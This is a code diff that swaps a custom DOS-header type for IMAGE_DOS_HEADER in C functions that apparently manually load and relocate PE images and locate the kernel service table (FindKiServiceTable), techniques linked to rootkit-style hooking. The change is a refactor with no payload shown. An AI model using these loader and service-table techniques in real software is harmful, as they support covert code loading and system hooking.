@@ -3,16 +3,16 @@
 #include "HM_SafeProcedures.h"
 #include "common.h"
 
-static BOOL readPEInfo(char *modulePos, MZHeader *outMZ, PE_Header *outPE, PE_ExtHeader *outpeXH, SectionHeader **outSecHdr)
+static BOOL readPEInfo(char *modulePos, IMAGE_DOS_HEADER*outMZ, PE_Header *outPE, PE_ExtHeader *outpeXH, SectionHeader **outSecHdr)
 {
-	MZHeader *mzH;
-	mzH = (MZHeader *)modulePos;
+	IMAGE_DOS_HEADER *mzH;
+	mzH = (IMAGE_DOS_HEADER*)modulePos;
 
-	if(mzH->signature != 0x5a4d)
+	if(mzH->e_magic != 0x5a4d)
 		return FALSE;
 
 	PE_Header *peH;
-	peH = (PE_Header *)(modulePos + mzH->offsetToPE);
+	peH = (PE_Header *)(modulePos + mzH->e_lfanew);
 
 	if(peH->sizeOfOptionHeader != sizeof(PE_ExtHeader))
 		return FALSE;
@@ -36,7 +36,7 @@ static BOOL readPEInfo(char *modulePos, MZHeader *outMZ, PE_Header *outPE, PE_Ex
 //
 //*******************************************************************************************************
 
-int calcTotalImageSize(MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
+int calcTotalImageSize(IMAGE_DOS_HEADER *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
 					   SectionHeader *inSecHdr)
 {
 	int result = 0;
@@ -91,7 +91,7 @@ ULONG getAlignedSize(unsigned long curSize, unsigned long alignment)
 //
 //*******************************************************************************************************
 
-BOOL loadPE(char *exePtr, MZHeader *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
+BOOL loadPE(char *exePtr, IMAGE_DOS_HEADER *inMZ, PE_Header *inPE, PE_ExtHeader *inpeXH,
 			SectionHeader *inSecHdr, LPVOID ptrLoc)
 {
 	char *outPtr = (char *)ptrLoc;
@@ -126,7 +126,7 @@ LPVOID loadDLL(char *dllName)
 {
 	char moduleFilename[MAX_PATH + 1];
 	LPVOID ptrLoc = NULL;
-	MZHeader mzH2;
+	IMAGE_DOS_HEADER mzH2;
 	PE_Header peH2;
 	PE_ExtHeader peXH2;
 	SectionHeader *secHdr2;
@@ -273,7 +273,7 @@ DWORD FindKiServiceTable(HMODULE hModule,DWORD dwKSDT)
 
 BOOL RelocImage(PVOID exeAddr, PVOID newAddr)
 {
-	MZHeader mzH2;
+	IMAGE_DOS_HEADER mzH2;
 	PE_Header peH2;
 	PE_ExtHeader peXH2;
 	SectionHeader *secHdr2;
